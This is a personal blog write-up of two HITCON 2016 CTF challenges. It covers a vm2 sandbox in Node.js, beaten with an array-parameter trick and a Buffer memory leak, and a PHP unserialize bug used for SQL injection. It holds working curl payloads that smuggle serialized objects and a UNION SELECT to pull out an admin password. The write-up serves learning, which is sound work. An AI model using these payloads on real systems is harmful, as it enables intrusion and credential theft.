---
title: "Hello HitCon 2016 CTF"
date: 2016-10-11T20:34:09.000Z
tags:
  - "hitcon-2016"
  - "ctf"
feature_image: "content/images/2016/10/Zrzut-ekranu-2016-10-11-o-22.48.44.webp"
---

# Hello HitCon 2016 CTF

This is the very first post on this blog so it serves as 'Hello world' in my journey through the world of CTFs.

I was always into this kind of challenges from quite a long time. I was doing some kind of security tasks from sites like [wechall.net](wechall.net), <http://www.bright-shadows.net> or [Rankk](http://www.rankk.org).

I was also for a short time taking part CTFs from [ctftime.org](https://ctftime.org) but I was lacking a good team and commitment so I give up.

This year I've promised myself to take another try. But to do this right - I needed a good team. The best even. So I've approached the captain of the best Polish team - [Dragon Sector](http://blog.dragonsector.pl) \- and asked if I can play with them in the CTFs. Of course it would be as a trial as I am learning to be on their level. To my surprise it wasn't very new to them and I was invited to play with them and the upcoming event was HitCon 2016 CTF.

So how was it? For sure - great fun. Tasks were very hard (at least on my level). The team came at 11th place and I've managed to solve one task for 200 pts and advance on the other (I did not play for the whole 48h)

So what tasks did I worked on?

## Leaking

It was a node.js application that uses a VM to run the user code. The source code was given and it looked like this:
[code]
    "use strict";

    var randomstring = require("randomstring");
    var express = require("express");
    var {VM} = require("vm2");
    var fs = require("fs");

    var app = express();
    var flag = require("./config.js").flag

    app.get("/", function (req, res) {
        res.header("Content-Type", "text/plain");

        /*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */
        eval("var flag_" + randomstring.generate(64) + " = \"hitcon{" + flag + "}\";")
        if (req.query.data && req.query.data.length <= 12) {
            var vm = new VM({
                timeout: 1000
            });
            console.log(req.query.data);
            res.send("eval ->" + vm.run(req.query.data));
        } else {
            res.send(fs.readFileSync(__filename).toString());
        }
    });

    app.listen(3000, function () {
        console.log("listening on port 3000!");
    });
[/code]

So the first challenge was to get pass through the check for the length of the data being passed to the node app. 12 characters is not that many. The second one was to jump out of the VM to read the flag. VM should be secure right? Not so much :)

The 12 character limit check was easy to break - it was only a matter of passing `data[0]` for `curl` and provide the input in the stdin.

`curl -g -G 'http://52.198.115.130:3000/' --data-urlencode "data[0]@-"`

Jumping of of the VM was a bit harder. I've tried different things. The VM wasn't as secure as you might imagine - just check [those issues](https://github.com/patriksimek/vm2/issues/32) on github that allow jumping out of the sandbox. But apparently the version used on the CTF was already patched. I needed to find something else.

I went on googling and found out that there's a different issue in Buffer type. [Looks like](https://github.com/nodejs/node/issues/4660) it does not clear the memory it allocates. So if you could allocated 10000 bytes it would print the content of memory with the contents that was there before. Bingo. That was what was needed. Just send to VM `new Buffer(10000)` and search for the flag in the output:

> hitcon{4nother h34rtbleed in n0dejs? or do u solved by other way?}

200 point collected!

## Baby Trick

We were given an info that

> There is no SQL Injection anymore!

And PHP source code

[View Gist](https://gist.github.com/pawlos/de6b345045f8a2f3d4141be8011989a9)

In which almost immediately we can see `unserialize` on untrusted input. Sweet. Is this going to be another easy one?

Ok, let's prepare a bogus data for unserialize:

`echo -ne 'O:6:"HITCON":3:{s:14:"\x00HITCON\x00method";s:4:"show";s:012:"\x00HITCON\x00args":a:2:{s:8:"username";s:6:"orange";s:8:"password";s:6:"123456";};s:12:"\x00HITCON\x00conn";b:0;}' | curl -D- -G http://52.198.42.246/ --data-urlencode 'data@-'`
and the result we got on the screen was promising:

> {"msg":"orange is admin"}[1]

As we can see from the PHP source code, input in the method show is not in any way escaped before being used in the SQL query. Let's see if we can do a SQLi there. Another payload:

`echo -ne 'O:6:"HITCON":3:{s:14:"\x00HITCON\x00method";s:4:"show";s:012:"\x00HITCON\x00args":a:2:{s:8:"username";s:18:"orange\x27#--sdasdasd";s:8:"password";s:6:"123456";};s:12:"\x00HITCON\x00conn";b:0;}' | curl -D- -G http://52.198.42.246/ --data-urlencode 'data@-'`

That returns the same output as before so there is an SQLi - never trust task descriptions :). Ok, now let's try to use this SQLi to our benefit. Can we extract Orange's password? Yup. Just need to construct such query:

`echo -ne 'O:6:"HITCON":3:{s:14:"\x00HITCON\x00method";s:4:"show";s:012:"\x00HITCON\x00args":a:2:{s:8:"username";s:95:"o\x27 UNION SELECT username,role as password, password as role from users WHERE username=\x27orange\x27#";s:8:"password";s:6:"123456";};s:12:"\x00HITCON\x00conn";b:0;}' | curl -D- -G http://52.198.42.246/ --data-urlencode 'data@-'`

lets focus for a moment what we do here. first we escape from the query by providing `\x27 (')` character and then we concatenate on UNION statement that will return for us a password for orange but because the code only prints the user's role we put the password there to get it on screen. Thanks to this trick we get:

> {"msg":"orange is babytrick1234"}

Ok, now we do have a user name and password. But looking at line [39](https://gist.github.com/pawlos/de6b345045f8a2f3d4141be8011989a9#file-babytrick-php-L39) in the login method we can't have 'orange' as our user name or in query in general. Bummer. And at this stage I've finished this task at the CTF. I've tried passing a `\0` in username but that didn't help. Also it did not help using some weird Unicode characters like [ZERO WIDTH SPACE](http://www.fileformat.info/info/unicode/char/200b/index.htm) or [WORD JOINER](http://www.fileformat.info/info/unicode/char/2060/index.htm). Nothing :/

I need to improve and be familiar with some PHP tricks if I want to make more progress in the upcoming CTFs.

See you at hack.lu

* * *

  1. Later I found out that the task was created by Orange Tsai - a guy how hacked Facebook - nice. ↩︎

